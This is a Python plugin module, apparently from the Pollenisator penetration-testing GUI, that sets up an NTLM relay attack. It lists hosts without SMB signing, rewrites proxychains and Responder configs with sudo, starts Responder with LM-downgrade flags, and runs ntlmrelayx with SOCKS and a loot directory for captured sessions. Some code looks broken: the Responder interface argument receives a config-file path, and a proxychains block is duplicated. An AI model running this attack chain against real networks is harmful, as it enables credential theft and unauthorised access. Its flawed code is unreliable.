import pollenisatorgui.core.Components.Utils as Utils
from pollenisatorgui.core.Application.Dialogs.ChildDialogQuestion import ChildDialogQuestion
from pollenisatorgui.core.Application.Dialogs.ChildDialogCombo import ChildDialogCombo
import tempfile
import os
import shutil
import tkinter as tk
from pollenisatorgui.core.Components.apiclient import APIClient


def main(apiclient):
    APIClient.setInstance(apiclient)
    smb_signing_list = apiclient.find("ActiveDirectory", {"infos.signing":"False"}, True)
    export_dir = Utils.getExportDir()
    file_name = os.path.join(export_dir, "relay_list.lst")
    with open(file_name, "w") as f:
        for computer in smb_signing_list:
            ip = computer.get("ip", "")
            if ip != "":
                f.write(ip+"\n")
    relaying_loot_path = os.path.join(export_dir, "loot_relay")
    try:
        os.makedirs(relaying_loot_path)
    except:
        pass
    dialog = ChildDialogQuestion(None, "Setup proxychains", "Do you want to edit proxychains conf to port 1080 ?")
    dialog.app.wait_window(dialog.app)
    cmd = ""
    if dialog.rvalue == "Yes":
        cmd = 'sudo sed -i -E "s/(socks[4-5]\s+127.0.0.1\s+)[0-9]+/\\11080/gm" /etc/proxychains.conf'
        Utils.executeInExternalTerm(f"'{cmd}'")
    responder_conf = ""
    if shutil.which("locate"):
        res_code, stdout = Utils.execute("locate Responder.conf", None)
        if stdout is None or stdout.strip() == "":
            file = tk.filedialog.askopenfilename(" Locate responder conf file please",filetypes=[('Config Files', '*.conf')])
            if file:
                responder_conf = file
        else:
            dialog = ChildDialogCombo(None, stdout.split("\n"), displayMsg="Choose your responder config file", width=200)
            dialog.app.wait_window(dialog.app)
            if dialog.rvalue is not None:
                responder_conf = dialog.rvalue.strip()
                Utils.executeInExternalTerm(f"sudo sed -i -E 's/(HTTP|SMB) = On/\1 = Off/gm' {responder_conf}")
                #TODO, ask interface
                Utils.executeInExternalTerm(f"sudo responder -I {dialog.rvalue} -dvw --lm --disable-ess")
    cmd = ""
    if dialog.rvalue == "Yes":
        cmd = 'sudo sed -i -E "s/(socks[4-5]\s+127.0.0.1\s+)[0-9]+/\\11080/gm" /etc/proxychains.conf'
        Utils.executeInExternalTerm(f"'{cmd}'")

    cmd = f"sudo ntlmrelayx -tf {file_name} -smb2support -socks -l {relaying_loot_path}"
    Utils.executeInExternalTerm(f"'{cmd}'")
    return True, f"Listening ntlmrelay opened, loot directory is here:"+str(relaying_loot_path)+"\n"+ \
            "Don't forget to open Responder with HTTP and SMB disabled\n" + \
                "Proxychains port should be 1080 (default)"
